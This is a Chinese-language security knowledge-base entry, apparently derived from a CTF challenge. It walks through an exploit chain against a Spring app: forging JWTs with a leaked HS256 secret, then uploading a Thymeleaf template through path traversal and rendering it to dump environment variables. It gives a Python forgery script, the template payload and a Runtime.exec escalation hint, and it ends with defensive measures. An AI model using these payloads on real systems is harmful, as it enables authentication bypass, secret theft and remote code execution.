---
id: web-java-expression-spel-jwt-leak-upload-thymeleaf-template-rce
title: JWT 密钥泄露伪造身份 + 路径穿越上传 Thymeleaf 模板：dynamic-template 渲染读取环境变量
type: scenario
domain: web
path: web/java/expression/spel
technique: jwt-leak-upload-thymeleaf-template-rce
tags:
- java
- jwt
- thymeleaf
- ssti
- file-upload
- path-traversal
- spring
- env
- template-injection
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V204
  verified_at: '2026-11-07T02:40:09+08:00'
  notes: 已对照原文与全部 89 张图片核对；JWT secret、../templates 上传与 dynamic-template 渲染一致；未在目标复现
url: /docs/web/java/expression/spel/web-java-expression-spel-jwt-leak-upload-thymeleaf-template-rce/
draft: false
kb_aliases:
- JWT 密钥泄露 伪造用户
- 上传 Thymeleaf 模板 RCE
- dynamic-template 模板渲染
- 路径穿越写 templates
- Spring 环境变量读取
---

## 一句话结论

应用源码泄露了 JWT 的 HS256 密钥，攻击者可伪造任意 `sub` 的合法 token；上传接口不限制文件类型且保存文件名可路径穿越，把 Thymeleaf 模板写到 `templates/` 目录；再访问 `/login/dynamic-template?value=<模板名>` 让 Spring 按用户指定模板名渲染，模板中的 `${@environment.getSystemEnvironment()}` 遍历 Spring 环境并输出全部环境变量，从而读取 flag。

## 原理

- JWT 是自包含凭证，HS256 的安全性完全依赖密钥；源码/配置文件泄露 `jwt_key` 后，攻击者可用 `jwt.encode(payload, secret, "HS256")` 伪造任意用户身份，通过认证。
- 上传接口只检查“已登录/已上传”，不校验扩展名与内容，且保存路径由原始文件名拼接（或可路径穿越），因此可以把文件写到 `templates/` 等模板目录。
- `/login/dynamic-template?value=xxx` 这类调试/动态模板路由把 `value` 直接当模板名交给 Thymeleaf 解析；Thymeleaf 表达式可以访问 Spring Bean，`${@environment.getSystemEnvironment()}` 返回系统环境变量 Map，遍历即可输出 flag。
- 该链的关键不是某个单点，而是“认证伪造 + 任意模板写入 + 用户可控模板名”三者叠加：缺 JWT 伪造则进不了上传/渲染；缺写入则无恶意模板；缺模板名可控则恶意模板不会被加载。

## 触发条件

- 应用使用 HS256 JWT，密钥在源码、配置或前端泄露。
- 存在可上传文件的功能，且对文件名/路径校验不足，进程对模板目录可写。
- 存在按用户输入模板名渲染的接口（dynamic-template、预览、主题等），Thymeleaf 未限制危险表达式。

## 利用步骤

1. 从源码/配置中获取 JWT 密钥，构造 `sub` 为合法用户的 HS256 token。
2. 用该 token 访问上传接口，文件名设为 `../templates/test`（按目标目录结构调整），内容为 Thymeleaf 模板。
3. 模板中遍历环境变量：`<div th:each="prop : ${@environment.getSystemEnvironment()}"><p th:text="${prop.key + ' = ' + prop.value}"></p></div>`。
4. 访问 `/login/dynamic-template?value=test`，页面渲染出环境变量，定位 flag。
5. 若目标环境变量中没有 flag，可改用 `T(java.lang.Runtime).getRuntime().exec(...)` 或文件读取表达式。

## PoC

JWT 伪造：

```python
import jwt, datetime
secret = "25d55ad283aa400af464c76d713c07add57f21e6a273781dbf8b7657940f3b03"
payload = {"sub": "user1", "iat": datetime.datetime.utcnow(),
           "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)}
print(jwt.encode(payload, secret.encode(), algorithm="HS256"))
```

Thymeleaf 模板：

```html
<html><body>
<div th:each="prop : ${@environment.getSystemEnvironment()}">
  <p th:text="${prop.key + ' = ' + prop.value}"></p>
</div>
</body></html>
```

上传文件名：`../templates/test`，随后访问 `/login/dynamic-template?value=test`。

## 变体与关联

- JWT 密钥来源：源码仓库、`application.yml`、前端打包文件、错误页/调试接口；也可用弱密钥爆破。
- 模板写入变体：主题名、模板编辑、文件上传 + 路径穿越、压缩包解压覆盖。
- Thymeleaf 利用变体：`${T(java.lang.Runtime)}`、`${@environment.getProperty(...)}`、片段表达式 `__${...}__::x`、SpEL 反射链。
- 关联：Thymeleaf 主题名存储型 SSTI、视图名预处理 SSTI、Spring Boot 环境变量泄露。

## 检测与防御

- 立即轮换 JWT 密钥，禁止把密钥写入源码/前端；使用强随机密钥并支持密钥轮换。
- 上传接口校验扩展名/内容，规范化路径并禁止 `..`；模板目录对 Web 进程只读。
- 动态模板路由使用模板名白名单，禁止用户输入直接作为模板名；关闭不必要的调试/预览接口。
- Thymeleaf 禁止危险表达式（`T()`、`@bean`、`new`），或使用受限方言/沙箱。
